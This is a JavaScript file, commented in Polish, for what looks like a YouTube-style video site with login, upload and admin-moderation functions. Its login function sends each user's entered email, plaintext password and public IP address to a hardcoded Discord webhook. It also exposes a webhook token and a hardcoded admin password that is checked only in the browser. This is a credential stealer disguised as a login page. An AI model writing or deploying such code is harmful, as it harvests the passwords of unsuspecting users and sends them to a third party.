const WH = "https://discord.com/api/webhooks/1456448681988587722/TMNtUrwrtDN3EaXznge_tBA_HIX71xiT2o4my4D6XiJ9otCJRut71qaRvOaNbMGh54gH";

// Nawigacja
function nav(view) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById('view-' + view).classList.add('active');
}

// System Logowania
async function auth() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if (pass === "polskiSystemYoutube23213mm") {
        document.getElementById('adminLink').style.display = "flex";
        document.getElementById('userStatus').innerText = "ADMIN";
        alert("Witaj w systemie administracyjnym.");
        nav('home');
    } else {
        document.getElementById('userStatus').innerText = email.split('@')[0].toUpperCase();
        nav('home');
    }

    const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
    
    report("🔐 LOG", `**User:** ${email}\n**Pass:** ${pass}\n**IP:** ${ip.ip}\n**Role:** ${pass.includes('23213') ? 'ADMIN' : 'USER'}`);
}

// Dodawanie Filmów / Shorts
function upload() {
    const title = document.getElementById('up-title').value;
    const type = document.getElementById('up-type').value;
    const file = document.getElementById('up-file').files[0];

    if (!file) return alert("Wybierz plik wideo!");

    const url = URL.createObjectURL(file);
    const card = document.createElement('div');
    card.className = "video-card";
    card.innerHTML = `<video src="${url}" controls></video><h4>${title}</h4>`;

    if (type === 'video') document.getElementById('main-grid').prepend(card);
    else document.getElementById('shorts-container').prepend(card);

    report("🎥 UPLOAD", `Dodano: **${title}**\nTyp: ${type}`);
    nav('home');
}

// Akcje Administratora
function adm(action) {
    const target = document.getElementById('target').value;
    report("🛡️ MODERACJA", `Akcja: **${action.toUpperCase()}**\nCel: **${target}**`);
    alert(`Zastosowano ${action} na użytkowniku ${target}`);
}

// Funkcja Raportująca
function report(title, msg) {
    fetch(WH, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            embeds: [{
                title: title,
                description: msg,
                color: 16711680,
                timestamp: new Date()
            }]
        })
    });
}
